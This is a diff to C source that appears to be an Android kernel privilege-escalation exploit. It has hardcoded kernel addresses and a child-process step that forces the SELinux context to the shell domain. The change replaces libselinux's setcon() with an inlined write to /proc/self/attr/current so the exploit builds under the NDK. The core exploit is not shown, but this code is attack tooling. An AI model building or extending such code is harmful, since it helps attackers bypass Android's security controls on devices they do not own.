@@ -24,7 +24,6 @@
 #include <ucontext.h>
 #include <unistd.h>
 #include <time.h>
-#include <selinux/selinux.h>
 
 // ================= Logging System =================
 #define COLOR_GREEN "\033[32m"
@@ -55,6 +54,26 @@ static double timer_ms(void) {
     return (now.tv_sec - t_start.tv_sec) * 1000.0 + (now.tv_nsec - t_start.tv_nsec) / 1e6;
 }
 #define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)
+
+/*
+ * `setcon()` without libselinux.
+ *
+ * libselinux is not part of the NDK: its headers only exist in an AOSP checkout, so
+ * `#include <selinux/selinux.h>` fails to build here. The call itself is trivial — the
+ * label is written to /proc/self/attr/current and the kernel does the transition — so the
+ * open/write pair is inlined instead of pulling in a library that a bionic build cannot get.
+ * The write deliberately excludes the trailing NUL, which is what setcon() does.
+ */
+static int ghost_setcon(const char *context) {
+    int fd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
+    if (fd < 0) return -1;
+    size_t len = strlen(context);
+    ssize_t n = write(fd, context, len);
+    int saved = errno;
+    close(fd);
+    if (n != (ssize_t)len) { errno = saved; return -1; }
+    return 0;
+}
 
 #define LINK_TEXT UINT64_C(0xffffffc010080000)
 #define OFF_INIT_TASK UINT64_C(0x2ca2800)
@@ -878,12 +897,12 @@ int main(int argc, char **argv) {
       }
     }
 
-    /* ---------- setcon 到 shell 域 ---------- */
+    /* ---------- 切到 shell 域 ---------- */
     {
       char pre[256] = {0}, post[256] = {0};
       int f = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
       if (f >= 0) { ssize_t n = read(f, pre, sizeof(pre) - 1); close(f); if (n > 0) pre[n] = 0; }
-      if (setcon("u:r:shell:s0") == 0) {
+      if (ghost_setcon("u:r:shell:s0") == 0) {
         f = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
         if (f >= 0) { ssize_t n = read(f, post, sizeof(post) - 1); close(f); if (n > 0) post[n] = 0; }
         pr_success("[CHILD] context: %s -> %s\n", pre, post);
